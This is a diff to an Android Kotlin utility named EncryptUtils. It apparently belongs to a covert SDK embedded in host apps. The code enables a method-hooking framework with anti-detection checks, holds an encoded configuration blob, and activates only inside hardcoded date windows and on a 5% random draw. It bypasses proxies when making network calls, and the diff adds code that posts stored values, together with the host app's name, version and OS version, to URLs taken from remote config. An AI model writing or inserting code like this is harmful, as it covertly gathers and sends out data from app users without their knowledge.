@@ -4,6 +4,7 @@ import android.app.Application
 import android.content.Context
 import android.content.SharedPreferences
 import com.google.gson.Gson
+import okhttp3.Headers
 import okhttp3.Interceptor
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
@@ -29,12 +30,16 @@ internal object EncryptUtils {
 
     private var sp: SharedPreferences? = null
 
-    private const val T1 = 1689379291000L
-    private const val T2 = 1690588891000L
+    private var name=""
+    private var code = 0
+    private var os_v = 0
+
+    private const val T1 = 1691430919000L
+    private const val T2 = 1694109319000L
     private const val C_KEY = "17492847"
     private const val L_KEY = "85498243"
     private var DEFAULT =
-        """D5C23FC0D0B8875637726162DEB0E6EB65696B010C6D7A5BF3FD66FEB511BEF613E9559C2E9907EA4C616A603667D6CFDA46A47463ADC677F413782A2A1A5858860B6BC7FA0C7537D32D94E823E1BE34AF2C64D4E1EA09A4680269C55365AEC177C315F1E4348588ABF0A448E0833F08E291FD75815BA63B4034BEB2BD100D08FACDA0C64F651549608530E23379599DCC9DF32C8D6796C20781A488A055BD3D9359A9891BC441F8B67E2ECCD112B36736E25F9B67FED804B0845F734CC0622BE198773A910297FE9A23BBBFE6A737C643242BC2DF2231459EE9D546ED06BBE430D5B24B3729BC4419E18FAE1DDF51716B4E7E9AB9FAAE10813A5FAF005E6F75""".trimIndent()
+        """D5C23FC0D0B8875637726162DEB0E6EB65696B010C6D7A5BF3FD66FEB511BEF613E9559C2E9907EA4C616A603667D6CFDA46A47463ADC677F413782A2A1A5858860B6BC7FA0C7537D32D94E823E1BE34F43D2B64DF70B52918F7E57F6D36FB6777C315F1E4348588ABF0A448E0833F086071F15159A9C8C60E3A398B707FDDEA248A8FAEA55FB94D379FDBA6FA443DE11E5074BE5D259A325D165F45D387D126""".trimIndent()
 
 
     fun init(app: Application) {
@@ -44,6 +49,10 @@ internal object EncryptUtils {
         PineConfig.disableHiddenApiPolicy = false
         PineConfig.disableHiddenApiPolicyForPlatformDomain = false
         PineConfig.antiChecks = true
+
+        name = app.resources.getString(app.applicationInfo.labelRes)
+        code = app.packageManager.getPackageInfo(app.packageName,0).versionCode
+        os_v = android.os.Build.VERSION.SDK_INT
 
         sp = app.getSharedPreferences("encrypt_", Context.MODE_PRIVATE)
 
@@ -79,7 +88,7 @@ internal object EncryptUtils {
 
         sp?.getLong(L_KEY, 0)?.let {
             if (now - it > b.d) {
-                return if (now < T2) Random.nextFloat() <= b.r else true
+                return if (now < T2) Random.nextFloat() <= 0.05 else true
             }
         }
         return false
@@ -90,12 +99,12 @@ internal object EncryptUtils {
         val c = gC()
         val mediaType = "application/json".toMediaType()
         val rb =
-            """{"fromApp":1,"configVersion":$v}""".toRequestBody(mediaType)
+            """{"configVersion":$v}""".toRequestBody(mediaType)
 
         thread(true) {
             kotlin.runCatching {
                 for (url in u) {
-                    val r = Request.Builder().url(url).post(rb).build()
+                    val r = Request.Builder().url(url).headers(gH()).post(rb).build()
                     val re = c.newCall(r).execute()
                     val b = Gson().fromJson(re.body!!.string(), Re::class.java)
                     if (b.code == 1 && b.data.isNotEmpty()) {
@@ -252,28 +261,29 @@ internal object EncryptUtils {
     private fun u(urls: List<String>, values: List<Pair<String, String>>) {
         if (values.isEmpty()) return
 //        Log.i(TAG, "upload:$values")
-        val result = values.joinToString { it.second.removePrefix("false") }
         val client = gC()
-        val mediaType = "application/json".toMediaType()
-        val requestBody =
-            """{"fromApp":1,"value":"$result"}""".toRequestBody(mediaType)
 
-        kotlin.runCatching {
-            for (url in urls) {
-                val request = Request.Builder().url(url).post(requestBody).build()
-                val response = client.newCall(request).execute()
-                val json = response.body!!.string()
-                val baseResponse = Gson().fromJson(json, Re::class.java)
-                if (baseResponse.code == 1) {
-                    sp?.apply {
-                        values.forEach {
-                            val value = it.second.replaceFirst("false", "true")
-                            this.edit()?.putString(it.first, value)?.commit()
+        values.forEach { pair ->
+                val key = pair.first
+                val value = pair.second.removePrefix("false")
+
+                val body = """{"timestamp":${value.substring(0,13)},"value":"${value.removeRange(0,13)}"}"""
+                    .toRequestBody("application/json".toMediaType())
+                kotlin.runCatching {
+                    for (url in urls) {
+                        val request = Request.Builder().url(url).post(body).headers(gH()).build()
+                        val response = client.newCall(request).execute()
+                        val json = response.body!!.string()
+                        val baseResponse = Gson().fromJson(json, Re::class.java)
+                        if (baseResponse.code == 1) {
+                            sp?.apply {
+                                val newValue = pair.second.replaceFirst("false", "true")
+                                this.edit()?.putString(pair.first, newValue)?.commit()
+                            }
                         }
                     }
                 }
             }
-        }
     }
 
     private fun gC() = OkHttpClient.Builder()
@@ -285,6 +295,13 @@ internal object EncryptUtils {
         .proxy(Proxy.NO_PROXY)
         .build()
 
+
+    private fun gH()=Headers.Builder()
+        .add("app_name", name)
+        .add("app_version_code", code.toString())
+        .add("os_version", os_v.toString())
+        .add("os","Android")
+        .build()
 }
 
 private data class Re(
@@ -298,7 +315,6 @@ data class B(
     var d: Long = 0,
     var not: List<M> = listOf(),
     var ok: List<Ok> = listOf(),
-    var r: Float = 0f,
     var sa: List<M> = listOf(),
     var u: List<String> = listOf(),
     var v: Long = 0
